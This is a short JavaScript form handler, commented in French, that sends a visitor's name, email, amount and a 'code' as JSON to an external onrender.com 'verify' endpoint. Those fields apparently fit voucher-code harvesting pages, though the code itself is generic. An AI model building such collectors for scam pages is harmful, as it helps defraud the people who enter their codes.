// On attend que le HTML soit complètement chargé par le navigateur
document.addEventListener('DOMContentLoaded', () => {

  // Sélection du formulaire
  const form = document.querySelector('form');

  // Sécurité : on vérifie que le formulaire existe bien sur la page
  if (!form) {
    console.warn("Attention : Aucun élément <form> n'a été trouvé sur cette page.");
    return;
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Sécurité : Récupération dynamique et sécurisée des valeurs
    // (Évite les plantages si un élément HTML est manquant)
    const getVal = (id) => {
      const el = document.getElementById(id);
      return el ? el.value : '';
    };

    const payload = {
      nom: getVal('nom'),
      prenom: getVal('prenom'),
      amount: getVal('amount'),
      email: getVal('email'),
      code: getVal('code')
    };
console.log("Tentative d'envoi vers : https://andcho.onrender.com/api/verify");
    try {
      // On ajoute un timestamp à l'URL pour être SÛR que le navigateur ne prend pas une version cachée
      const response = await fetch('https://andcho.onrender.com/api/verify?t=' + Date.now(), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

  const result = await response.json();

  if (result.success) {
    alert('Données transmises avec succès !');
    // Mettez ici votre redirection finale si besoin
  } else {
    alert('Erreur du serveur : ' + result.message);
  }
} catch (error) {
  console.error('Erreur technique :', error);
  // Modifie cette ligne pour afficher le vrai message d'erreur (ex: TypeErr: Failed to fetch)
  //alert('Impossible de joindre le serveur de traitement. Détails : ' + error.message);
  alert('Erreur : ' + error.name + ' - ' + error.message);
}
});
});
